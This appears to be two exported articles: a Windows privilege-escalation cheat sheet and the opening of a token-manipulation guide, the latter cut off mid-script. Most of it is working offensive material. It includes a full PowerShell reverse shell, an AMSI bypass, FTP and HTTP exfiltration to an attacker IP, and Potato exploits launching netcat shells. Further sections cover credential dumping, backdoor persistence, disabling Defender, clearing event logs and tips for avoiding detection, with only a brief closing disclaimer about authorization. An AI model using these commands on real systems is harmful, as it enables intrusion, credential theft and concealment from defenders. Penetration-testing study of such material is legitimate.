articles.title: COMPREHENSIVE WINDOWS PRIVILEGE ESCALATION COMMANDS TABLE
articles.content:
# **COMPREHENSIVE WINDOWS PRIVILEGE ESCALATION COMMANDS TABLE**

## **SYSTEM INFORMATION ENUMERATION**

| Category | Command | Description |
|----------|---------|-------------|
| **Basic System Info** | `systeminfo` | Displays detailed OS, hardware, and patch information |
| **OS Version** | `systeminfo \| findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"` | Extracts key OS version details |
| **Architecture** | `wmic os get osarchitecture` | Shows 32-bit or 64-bit architecture |
| **Build Number** | `cmd /c ver` | Quick version check |
| **Installed Updates** | `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists all installed Windows updates |
| **Environment** | `set` | Shows all environment variables |
| **UAC Settings** | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\` | Checks UAC configuration |
| **Virtual Machine** | `systeminfo \| findstr /I "System Model:"` | Detects if running in a VM |

## **USER & GROUP ENUMERATION**

| Category | Command | Description |
|----------|---------|-------------|
| **Current User** | `whoami` | Shows current username |
| **User Privileges** | `whoami /priv` | Displays token privileges |
| **All Privileges** | `whoami /all` | Shows all user information |
| **Local Users** | `net user` | Lists all local user accounts |
| **User Details** | `net user [username]` | Shows details for specific user |
| **PowerShell Users** | `Get-LocalUser` | PowerShell alternative to list users |
| **Local Groups** | `net localgroup` | Lists all local groups |
| **Administrators** | `net localgroup Administrators` | Shows members of Administrators group |
| **Group Members** | `Get-LocalGroupMember -GroupName "Administrators"` | PowerShell method for group members |
| **Domain Info** | `net config workstation` | Shows domain information |
| **Domain Groups** | `net group /domain` | Lists domain groups (requires domain) |

## **NETWORK INFORMATION**

| Category | Command | Description |
|----------|---------|-------------|
| **Network Config** | `ipconfig /all` | Detailed network configuration |
| **ARP Cache** | `arp -a` | Shows ARP table |
| **Routing Table** | `route print` | Displays routing information |
| **Active Connections** | `netstat -ano` | Shows all network connections with PIDs |
| **Listening Ports** | `netstat -ano \| findstr LISTENING` | Shows only listening ports |
| **Firewall Status** | `netsh advfirewall show allprofiles` | Shows firewall configuration |
| **Network Shares** | `net share` | Lists local SMB shares |
| **Remote Shares** | `net view \\localhost` | Shows shares on local machine |

## **PROCESS & SERVICES**

| Category | Command | Description |
|----------|---------|-------------|
| **Running Processes** | `tasklist /svc` | Shows processes with services |
| **Detailed Processes** | `tasklist /v` | Verbose process listing |
| **PowerShell Processes** | `Get-Process` | PowerShell process listing |
| **All Services** | `net start` | Shows running services |
| **Service Details** | `sc query` | Shows service status |
| **All Service States** | `sc query state= all` | Shows all services regardless of state |
| **Service Config** | `sc qc [service_name]` | Shows service configuration |
| **WMI Services** | `Get-WmiObject -Class Win32_Service` | PowerShell WMI service query |
| **Service Binaries** | `wmic service get name,displayname,pathname,startmode` | Shows service executable paths |

## **SCHEDULED TASKS**

| Category | Command | Description |
|----------|---------|-------------|
| **All Tasks** | `schtasks /query /fo LIST /v` | Detailed scheduled tasks list |
| **Formatted Tasks** | `schtasks /query /fo TABLE` | Table-formatted tasks |
| **PowerShell Tasks** | `Get-ScheduledTask` | PowerShell scheduled tasks |
| **Task Info** | `Get-ScheduledTask \| Get-ScheduledTaskInfo` | Shows task execution info |
| **Task Export** | `schtasks /query /xml /tn "TaskName"` | Exports task as XML |

## **INSTALLED SOFTWARE**

| Category | Command | Description |
|----------|---------|-------------|
| **Installed Programs** | `wmic product get name,version` | Lists installed software |
| **Registry Programs** | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s` | Shows installed programs from registry |
| **64-bit Apps** | `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"` | PowerShell 64-bit programs |
| **32-bit Apps** | `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"` | PowerShell 32-bit programs |

## **FILE SYSTEM & PERMISSIONS**

| Category | Command | Description |
|----------|---------|-------------|
| **Drive Info** | `wmic logicaldisk get caption,size,freespace` | Shows disk information |
| **Search Files** | `dir /s /b *.config *.xml *.ini *.txt 2>nul` | Searches for config files |
| **Search Passwords** | `findstr /si password *.txt *.xml *.ini 2>nul` | Searches for passwords in files |
| **Permission Check** | `icacls "C:\Path\To\File"` | Shows file/folder permissions |
| **AccessChk** | `accesschk.exe -uws "Users" "C:\Program Files\"` | Sysinternals permission checker |
| **Writable Directories** | `accesschk.exe -uwd "Users" "C:\"` | Finds writable directories |

## **REGISTRY CHECKS**

| Category | Command | Description |
|----------|---------|-------------|
| **AutoRun HKLM** | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Machine-wide startup programs |
| **AutoRun HKCU** | `reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | User startup programs |
| **AlwaysInstallElevated** | `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Checks if MSI installs elevated |
| **AlwaysInstallElevated** | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Machine-wide MSI setting |
| **LSA Secrets** | `reg query HKLM\SECURITY\Policy\Secrets` | Lists LSA secrets (needs SYSTEM) |

## **VULNERABILITY CHECKS**

| Category | Command | Description |
|----------|---------|-------------|
| **Unquoted Service Paths** | `wmic service get name,displayname,pathname,startmode \| findstr /i auto \| findstr /i /v """` | Finds services with unquoted paths |
| **Weak Service Permissions** | `sc sdshow [service_name]` | Shows service security descriptor |
| **Writable Service Binaries** | `icacls "C:\Path\To\Service.exe"` | Checks permissions on service executables |
| **PATH Variable Check** | `echo %PATH%` | Shows PATH environment variable |
| **Writable PATH** | `for %i in (%path%) do @echo %i && icacls "%i" 2>nul \| findstr "(W)"` | Finds writable directories in PATH |
| **Sticky Keys Check** | `icacls C:\Windows\System32\sethc.exe` | Checks sticky keys permissions |

## **CREDENTIAL HUNTING**

| Category | Command | Description |
|----------|---------|-------------|
| **Stored Credentials** | `cmdkey /list` | Lists stored Windows credentials |
| **Use Saved Creds** | `runas /savecred /user:[user] "cmd.exe"` | Uses saved credentials |
| **Search Creds in Files** | `findstr /spin "password\|pass\|pwd" *.* 2>nul` | Searches for credentials in files |
| **SAM Dump** | `reg save HKLM\SAM sam.save` | Saves SAM hive (needs admin) |
| **SYSTEM Dump** | `reg save HKLM\SYSTEM system.save` | Saves SYSTEM hive |
| **IIS Configs** | `type C:\inetpub\wwwroot\web.config \| findstr connectionString` | Looks for DB credentials |

## **PRIVILEGE ESCALATION EXPLOITS**

| Category | Command | Description |
|----------|---------|-------------|
| **JuicyPotato** | `.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *` | Token impersonation exploit |
| **PrintSpoofer** | `.\PrintSpoofer.exe -i -c cmd` | Windows 10/Server 2019+ exploit |
| **RoguePotato** | `.\RoguePotato.exe -r [ATTACKER_IP] -l 9999 -e "cmd.exe"` | Alternative to JuicyPotato |
| **MSI Exploit** | `msiexec /quiet /qn /i evil.msi` | Executes MSI with elevated privileges |
| **Service Binary Replace** | `sc config [service] binpath="cmd.exe /c net user hacker Pass123! /add"` | Modifies service binary path |
| **Sticky Keys** | `copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe` | Creates sticky keys backdoor |

## **DOMAIN PRIVILEGE ESCALATION**

| Category | Command | Description |
|----------|---------|-------------|
| **Kerberoast** | `.\Rubeus.exe kerberoast /outfile:hashes.txt` | Exports Kerberos tickets for cracking |
| **AS-REP Roast** | `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt` | Gets AS-REP hashes |
| **BloodHound** | `.\SharpHound.exe -c All` | Collects AD enumeration data |
| **GPP Passwords** | `findstr /S cpassword \\[DOMAIN]\SYSVOL\[DOMAIN]\Policies\*.xml` | Finds Group Policy passwords |
| **DNSAdmins** | `dnscmd /config /serverlevelplugindll \\attacker\share\evil.dll` | DNSAdmins privilege escalation |
| **Unconstrained Delegation** | `Get-ADComputer -Filter {TrustedForDelegation -eq $True}` | Finds computers with unconstrained delegation |

## **POWER SHELL COMMANDS**

| Category | Command | Description |
|----------|---------|-------------|
| **Execution Policy Bypass** | `powershell -ep bypass -c "[script]"` | Bypasses PowerShell execution policy |
| **Download File** | `powershell -c "Invoke-WebRequest -Uri http://server/file.exe -OutFile file.exe"` | Downloads file from web |
| **Reverse Shell** | `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | PowerShell reverse shell |
| **AMSI Bypass** | `powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"` | Disables AMSI protection |
| **PowerUp** | `powershell -ep bypass; Import-Module .\PowerUp.ps1; Invoke-AllChecks` | Runs PowerUp privilege escalation checks |
| **Mimikatz PowerShell** | `Invoke-Mimikatz -DumpCreds` | PowerShell version of Mimikatz |

## **MISCELLANEOUS USEFUL COMMANDS**

| Category | Command | Description |
|----------|---------|-------------|
| **Download with CertUtil** | `certutil -urlcache -split -f http://server/file.exe file.exe` | Downloads file using CertUtil |
| **Download with Bitsadmin** | `bitsadmin /transfer job /download /priority high http://server/file.exe file.exe` | Downloads using BITS |
| **Volume Shadow Copy** | `vssadmin create shadow /for=C:` | Creates volume shadow copy |
| **Check AV** | `sc query windefend` | Checks Windows Defender status |
| **Disable Defender** | `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f` | Disables Windows Defender |
| **Clear Event Logs** | `wevtutil cl System` | Clears System event log |
| **Persistence - Run Key** | `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\evil.exe"` | Adds registry persistence |
| **Persistence - Service** | `sc create Backdoor binpath= "C:\evil.exe" start= auto` | Creates malicious service |
| **Persistence - Task** | `schtasks /create /tn Backdoor /tr "C:\evil.exe" /sc onlogon /ru System` | Creates scheduled task persistence |

## **AUTOMATED TOOLS**

| Category | Command | Description |
|----------|---------|-------------|
| **WinPEAS** | `.\winPEASany.exe quiet` | Runs WinPEAS quietly |
| **WinPEAS Detailed** | `.\winPEASany.exe cmd` | Runs WinPEAS with cmd output |
| **Seatbelt** | `.\Seatbelt.exe -group=all` | Runs all Seatbelt checks |
| **Watson** | `.\Watson.exe` | Runs Windows vulnerability checker |
| **SharpUp** | `.\SharpUp.exe audit` | Runs SharpUp privilege escalation audit |
| **LaZagne** | `.\LaZagne.exe all` | Extracts passwords from various sources |
| **Mimikatz** | `mimikatz # sekurlsa::logonpasswords` | Dumps credentials from memory |
| **Mimikatz LSA** | `mimikatz # lsadump::sam` | Dumps SAM database |

## **QUICK CHECK ONE-LINERS**

| Category | Command | Description |
|----------|---------|-------------|
| **Quick Enum** | `whoami && whoami /priv && systeminfo \| findstr /B /C:"OS"` | Quick user and system info |
| **Service Check** | `wmic service get name,pathname \| findstr /v /i "c:\windows"` | Finds non-standard services |
| **Unquoted Paths** | `wmic service get name,pathname \| findstr /i "\.exe" \| findstr /i /v """` | Finds executables without quotes |
| **Writable Check** | `for /f "tokens=*" %i in ('wmic service get pathname 2^>nul') do @echo %i && icacls "%i" 2>nul \| findstr "(W)"` | Checks writable service binaries |
| **Token Privileges** | `whoami /priv \| findstr /i "Enabled"` | Shows enabled privileges |
| **AutoRun Check** | `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s && reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s` | Checks all autorun locations |

## **DEFENSE EVASION**

| Category | Command | Description |
|----------|---------|-------------|
| **Disable Windows Defender** | `Set-MpPreference -DisableRealtimeMonitoring $true` | PowerShell method to disable Defender |
| **Exclude Path** | `Add-MpPreference -ExclusionPath "C:\temp"` | Excludes path from Defender scans |
| **Disable Firewall** | `netsh advfirewall set allprofiles state off` | Turns off Windows Firewall |
| **Clear PowerShell History** | `Remove-Item (Get-PSReadlineOption).HistorySavePath` | Clears PowerShell command history |
| **Delete Prefetch** | `del /f /q C:\Windows\Prefetch\*` | Deletes Prefetch files |
| **Clear Recent Docs** | `del /f /q %appdata%\Microsoft\Windows\Recent\*` | Clears recent documents |
| **Alternate Data Streams** | `type evil.exe > legit.txt:evil.exe` | Hides file in ADS |
| **Execute from ADS** | `wmic process call create c:\legit.txt:evil.exe` | Executes file from ADS |

## **POST-EXPLOITATION**

| Category | Command | Description |
|----------|---------|-------------|
| **Dump Chrome Passwords** | `.\LaZagne.exe browsers` | Extracts browser passwords |
| **WiFi Passwords** | `netsh wlan show profiles` | Shows saved WiFi networks |
| **WiFi Key** | `netsh wlan show profile name="[SSID]" key=clear` | Shows WiFi password |
| **Screenshot** | `powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PrtSc}')"` | Takes screenshot |
| **Keylogger** | `.\Invoke-Keylogger.ps1 -Duration 60` | Starts keylogger |
| **Lateral Movement** | `psexec.exe \\[TARGET] -u [USER] -p [PASS] cmd.exe` | PsExec lateral movement |
| **WMI Lateral** | `wmic /node:[TARGET] /user:[USER] /password:[PASS] process call create "cmd.exe"` | WMI lateral movement |
| **SMB Exec** | `.\smbexec.py [USER]:[PASS]@[TARGET]` | SMB-based lateral movement |

## **CLEANUP & EXFILTRATION**

| Category | Command | Description |
|----------|---------|-------------|
| **Delete Tools** | `del /f /q /s C:\temp\*` | Deletes tools from temp directory |
| **Clear Logs** | `wevtutil cl Application && wevtutil cl System && wevtutil cl Security` | Clears all major event logs |
| **Delete Prefetch** | `del /f /q C:\Windows\Prefetch\*.pf 2>nul` | Clears Prefetch files |
| **Compress Data** | `powershell Compress-Archive -Path C:\data\* -DestinationPath C:\temp\data.zip` | Compresses data for exfiltration |
| **Base64 Encode** | `certutil -encode file.txt file.b64` | Base64 encodes file |
| **Exfil via FTP** | `echo open [ATTACKER_IP] > ftp.txt && echo USER >> ftp.txt && echo PASS >> ftp.txt && echo put file.txt >> ftp.txt && echo bye >> ftp.txt && ftp -s:ftp.txt` | Exfiltrates via FTP |
| **Exfil via HTTP** | `powershell -c "(New-Object Net.WebClient).UploadFile('http://[ATTACKER_IP]/upload', 'file.txt')"` | Exfiltrates via HTTP |
| **Remove Persistence** | `reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /f` | Removes registry persistence |

# **COMPLETE PRIVILEGE ESCALATION GUIDE - WINDOWS**

## **PHASE 1: INITIAL ENUMERATION (Post-Exploitation)**

### **System Information**
```cmd
# Basic system info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

# OS version details
wmic os get Caption,Version,OSArchitecture,CSDVersion,BuildNumber,SerialNumber

# Environment variables
set
Get-ChildItem Env: | ft Key,Value

# Check if it's a VM
wmic computersystem get Manufacturer,Model
wmic bios get serialnumber
systeminfo | findstr /I "System Model:"

# Check UAC settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

### **User & Group Information**
```cmd
# Current user context
whoami
whoami /priv
whoami /groups
whoami /all

# Token privileges
net user %username%
net user %username% /domain

# All users
net user
Get-LocalUser | ft Name,Enabled,LastLogon
Get-LocalUser | ft *

# All groups
net localgroup
Get-LocalGroup | ft Name

# Administrators group
net localgroup Administrators
Get-LocalGroupMember -GroupName "Administrators"

# Domain information (if applicable)
net config workstation
net view /domain
net group /domain
```

### **Network Information**
```cmd
# Network configuration
ipconfig /all
arp -a
route print
netstat -ano
netstat -ano | findstr LISTENING
netstat -ano | findstr ESTABLISHED

# Firewall status
netsh advfirewall show allprofiles
netsh firewall show state

# Network shares
net share
net view \\localhost
Get-SmbShare | ft Name,Path,Description
```

### **Process & Service Information**
```cmd
# Running processes
tasklist /svc
tasklist /v
Get-Process | ft ProcessName,Id,Path

# Services
net start
sc query
sc query state= all
Get-Service | ft Name,DisplayName,Status,StartType
Get-WmiObject -Class Win32_Service | Select-Object Name,DisplayName,PathName,StartName,StartMode,State

# Service details
sc qc [service_name]
sc queryex [service_name]
```

### **Scheduled Tasks**
```cmd
# List scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo TABLE
Get-ScheduledTask | ft TaskName,TaskPath,State
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | ft TaskName,TaskPath,State

# Export all tasks to file
schtasks /query /fo LIST /v > tasks.txt
```

### **Installed Applications & Updates**
```cmd
# Installed programs
wmic product get name,version,vendor
Get-WmiObject -Class Win32_Product | Select-Object Name,Version

# From registry (more reliable)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s

# PowerShell method
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate | Format-Table -AutoSize
Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate | Format-Table -AutoSize

# Installed updates
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | sort InstalledOn -Descending | ft HotFixID,InstalledOn,InstalledBy
```

### **File System & Permissions**
```cmd
# Drives and free space
wmic logicaldisk get caption,description,filesystem,size,freespace
Get-PSDrive -PSProvider FileSystem

# Interesting directories
dir /s /b *.config *.xml *.ini *.txt 2>nul
dir /s /b *pass* *cred* *secret* *.vmdk *.vhdx 2>nul
dir /s /b *.bat *.cmd *.ps1 *.vbs *.sh 2>nul

# Permission checking tool (AccessChk from Sysinternals)
accesschk.exe -uws "Users" "C:\Program Files\"
accesschk.exe -uws "Authenticated Users" "C:\"
accesschk.exe -uwd "Users" "C:\"
```

### **Registry Checks**
```cmd
# Auto-run programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run

# AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# LSA Secrets (requires SYSTEM)
reg query HKLM\SECURITY\Policy\Secrets
```

## **PHASE 2: AUTOMATED ENUMERATION TOOLS**

### **PowerShell Based Tools**
```powershell
# PowerUp.ps1 - Most comprehensive
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Sherlock.ps1 - Find local privilege escalation vulnerabilities
Import-Module .\Sherlock.ps1
Find-AllVulns

# JAWS - Just Another Windows (Enum) Script
Import-Module .\jaws-enum.ps1

# Seatbelt - C#/PowerShell enumeration tool
.\Seatbelt.exe -group=all -full

# WinPEAS - Windows Privilege Escalation Awesome Script
.\winPEASany.exe quiet
.\winPEASany.exe cmd
```

### **Executable Tools**
```cmd
# Windows Exploit Suggester
python windows-exploit-suggester.py --database 2021-06-10-mssb.xlsx --systeminfo systeminfo.txt

# Watson (.NET tool)
.\Watson.exe

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# SharpUp (C# version of PowerUp)
.\SharpUp.exe audit
```

## **PHASE 3: COMMON PRIVILEGE ESCALATION VECTORS**

### **1. Kernel Exploits**
```cmd
# Check architecture
wmic os get osarchitecture

# Check patch level
wmic qfe | findstr /C:"KB2999226" /C:"KB976902" /C:"KB3033929"

# Common vulnerable versions
# Windows 7 SP1 (x64) - Try JuicyPotato/MS10-059/MS11-080
# Windows 8.1/Server 2012 R2 - Try MS16-032/MS16-098
# Windows 10/Server 2016+ - Try PrintNightmare/SAM-Theft/Token manipulation

# Check vulnerability with Watson
.\Watson.exe

# Example exploit usage
.\CVE-2021-1675.exe \\localhost\share\revshell.dll
.\MS16-032.exe
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe 10.10.14.5 443 -e cmd.exe" -t *
```

### **2. Service Exploitation**

#### **Unquoted Service Paths**
```cmd
# Find services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Alternative PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name,DisplayName,PathName,StartMode

# Example: If path is "C:\Program Files\Vulnerable App\service.exe"
# You can place "Program.exe" in C:\ or "Vulnerable.exe" in "C:\Program Files\"
```

#### **Weak Service Permissions**
```cmd
# Check if you can modify a service
sc qc [service_name]
sc sdshow [service_name]

# Using AccessChk
accesschk.exe -ucqv [service_name]

# Using PowerShell
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\[service_name]" | Format-List

# If you have SERVICE_CHANGE_CONFIG permission:
sc config [service_name] binpath="C:\Windows\System32\cmd.exe /c net user hacker Password123! /add"
sc config [service_name] obj=".\LocalSystem" password=""
sc start [service_name]
```

#### **Service Binary Permissions**
```cmd
# Check permissions on service binary
icacls "C:\Path\To\Service\binary.exe"

# If writable, replace with your payload
copy /y C:\temp\revshell.exe "C:\Path\To\Service\binary.exe"
sc stop [service_name]
sc start [service_name]
```

### **3. DLL Hijacking**
```cmd
# Find missing DLLs with ProcMon
# Filter: Result is NAME NOT FOUND, Path ends with .dll

# Common hijack locations (writable):
# Current directory
# C:\Windows\System32\ (rarely writable)
# C:\Windows\SysWOW64\
# C:\Program Files\AppName\
# User's AppData folder

# Example for "C:\Program Files\Vulnerable\app.exe" looking for "missing.dll"
# Place your malicious missing.dll in C:\Program Files\Vulnerable\
```

### **4. AlwaysInstallElevated**
```cmd
# Check registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 0x1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o evil.msi

# Execute MSI
msiexec /quiet /qn /i evil.msi
```

### **5. Scheduled Tasks**
```cmd
# Check permissions on task XML files
icacls C:\Windows\System32\Tasks\*

# If you can modify a task running as SYSTEM
# 1. Export task
schtasks /query /xml /tn "TaskName" > task.xml

# 2. Modify XML to execute your payload
# 3. Delete and re-create task
schtasks /delete /tn "TaskName" /f
schtasks /create /xml task.xml /tn "TaskName"
```

### **6. PATH Variable Hijacking**
```cmd
# Check PATH variable
```

## **üõ†Ô∏è POST-EXPLOITATION TOOLKIT**

```bash
# Defense Evasion
- Invoke-Obfuscation

- Veil-Evasion/Shellter
```

### **Quick Reference Cheat Sheet**

```powershell
# 1. Initial Enumeration
systeminfo && whoami /all && net user && net localgroup

# 2. Privilege Escalation
.\winPEASany.exe quiet
Invoke-AllChecks (PowerUp)
Get-Process | Where-Object {$_.ProcessName -eq "lsass"} | Select-Object Id

# 3. Credential Dumping
Invoke-Mimikatz -DumpCreds
reg save HKLM\SAM sam.save && reg save HKLM\SYSTEM system.save

# 4. Lateral Movement
Invoke-WMIExec -ComputerName TARGET -Command "whoami" -Username USER -Password PASS

# 5. Domain Enumeration

# 6. Persistence

reg add "HKLM\...\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# 7. Data Exfiltration

# 8. Cleanup
wevtutil cl Application,System,Security
Remove-Item C:\tools\* -Force -Recurse
```

### **Detection Avoidance Tips**

1. **Operate during business hours** - Blend with normal traffic
2. **Use legitimate ports** - HTTPS (443), DNS (53), SMB (445)
3. **Mimic normal user behavior** - Don't run everything as SYSTEM
4. **Limit tool usage** - Prefer built-in Windows utilities
5. **Clean up as you go** - Delete tools after use
6. **Use encryption** - Encrypt all exfiltrated data
7. **Slow is smooth** - Don't rush; rapid actions attract attention
8. **Test commands first** - Know what logs they generate

```
   ‚Üì

   ‚Üì

   ‚Üì
8. EXFILTRATE DATA
   ‚Üì
9. CLEAN UP TRACES
   ‚Üì
10. MAINTAIN ACCESS
```

---

## **‚ö†Ô∏è LEGAL & ETHICAL CONSIDERATIONS**

1. **Authorization Required** - Only test on systems you own or have written permission to test
2. **Scope Definition** - Stay within authorized boundaries
3. **Data Handling** - Protect any sensitive data encountered
4. **Reporting** - Document all findings for remediation
5. **Responsible Disclosure** - Report vulnerabilities to appropriate parties

**Remember:** This knowledge is for defensive purposes, penetration testing with authorization, and cybersecurity education only. Unauthorized access to computer systems is illegal and unethical.er

articles.content:
# **COMPLETE TOKEN MANIPULATION & PRIVILEGE ESCALATION GUIDE**

## **üîë UNDERSTANDING WINDOWS TOKENS**

### **Token Types & Privileges**

| Token Type | Description | Typical Users |
|------------|-------------|---------------|
| **Primary Token** | Represents security context of a process | User processes |
| **Impersonation Token** | Allows thread to act on behalf of another user | Service accounts, RPC |
| **Delegation Token** | Can be passed to remote systems | Domain accounts |
| **Anonymous Token** | No user identity | Anonymous access |

### **Critical Privileges for Escalation**

| Privilege | Constant Value | Description | Attack Vector |
|-----------|----------------|-------------|---------------|
| **SeImpersonatePrivilege** | `SeImpersonatePrivilege` | Impersonate any user | Potato family exploits |
| **SeAssignPrimaryPrivilege** | `SeAssignPrimaryPrivilege` | Assign primary token | Token manipulation |
| **SeTcbPrivilege** | `SeTcbPrivilege` | Act as part of OS | Direct SYSTEM access |
| **SeBackupPrivilege** | `SeBackupPrivilege` | Backup files/dirs | File access bypass |
| **SeRestorePrivilege** | `SeRestorePrivilege` | Restore files/dirs | File modification bypass |
| **SeCreateTokenPrivilege** | `SeCreateTokenPrivilege` | Create tokens | Create arbitrary tokens |
| **SeLoadDriverPrivilege** | `SeLoadDriverPrivilege` | Load/unload drivers | Kernel exploitation |
| **SeTakeOwnershipPrivilege** | `SeTakeOwnershipPrivilege` | Take ownership | File/registry ownership |
| **SeDebugPrivilege** | `SeDebugPrivilege` | Debug programs | Process memory access |

---

## **1Ô∏è‚É£ INITIAL ENUMERATION**

### **Check Current Token Privileges**

```cmd
# Basic privilege check
whoami /priv
whoami /all
whoami /groups

# PowerShell alternative
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups
[System.Security.Principal.WindowsIdentity]::GetCurrent().Claims | Where-Object { $_.Value -match "S-1-5-.*" }
```

### **Comprehensive Privilege Analysis Script**

```powershell
function Get-TokenPrivileges {
    param(
        [switch]$Detailed,
        [int]$ProcessId = $pid
    )
    
    Write-Host "`n=== Token Privilege Analysis ===" -ForegroundColor Cyan
    Write-Host "Process ID: $ProcessId" -ForegroundColor Yellow
    
    # Method 1: Using whoami.exe
    Write-Host "`n[1] WHOAMI Output:" -ForegroundColor Green
    $whoamiOutput = whoami /priv 2>$null
    $whoamiOutput
    
    # Method 2: PowerShell enumeration
    Write-Host "`n[2] PowerShell Analysis:" -ForegroundColor Green
    
    # Get process token
    try {
        $process = Get-Process -Id $ProcessId -ErrorAction Stop
        Write-Host "Process Name: $($process.ProcessName)" -ForegroundColor Gray
        Write-Host "Session ID: $($process.SessionId)" -ForegroundColor Gray
        
        # Check for SeImpersonate and other critical privileges
        $criticalPrivileges = @(
            "SeImpersonatePrivilege",
            "SeAssignPrimaryPrivilege", 
            "SeTcbPrivilege",
            "SeBackupPrivilege",
            "SeRestorePrivilege",
            "SeCreateTokenPrivilege",
            "SeLoadDriverPrivilege",
            "SeTakeOwnershipPrivilege",
            "SeDebugPrivilege"
        )
        
        Write-Host "`nCritical Privileges Status:" -ForegroundColor Yellow
        
        foreach ($priv in $criticalPrivileges) {
            $privStatus = $whoamiOutput | Select-String $priv
            if ($privStatus) {
                $status = $privStatus.ToString()
                if ($status -match "Enabled") {
                    Write-Host "  [!] $priv: ENABLED" -ForegroundColor Red
                } elseif ($status -match "Disabled") {
                    Write-Host "  [+] $priv: Disabled (but assigned)" -ForegroundColor Yellow
                } else {
                    Write-Host "  [?] $priv: $status" -ForegroundColor Gray
                }
            } else {
                Write-Host "  [-] $priv: Not assigned" -ForegroundColor Gray
            }
        }
        
        # Check token type
        Write-Host "`n[3] Token Type Analysis:" -ForegroundColor Green
        $tokenType = (whoami /groups 2>$null | Select-String "Mandatory Label")
        if ($tokenType) {
            Write-Host "Mandatory Integrity Level:" -ForegroundColor Gray
            $tokenType | ForEach-Object { Write-Host "  $_" -ForegroundColor White }
        }
        
        # Check for service accounts
        $serviceSIDs = @(
            "S-1-5-80", # NT SERVICE
            "S-1-5-20", # NT Authority Network Service
            "S-1-5-19", # NT Authority Local Service
            "S-1-5-18"  # NT Authority SYSTEM
        )
        
        $currentSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        if ($serviceSIDs -contains $currentSID) {
            Write-Host "`n[!] Running as service account: $currentSID" -ForegroundColor Red
        }
        
    } catch {
        Write-Host "Error analyzing process: $_" -ForegroundColor Red
    }
    
    # Method 3: Advanced WMI enumeration
    if ($Detailed) {
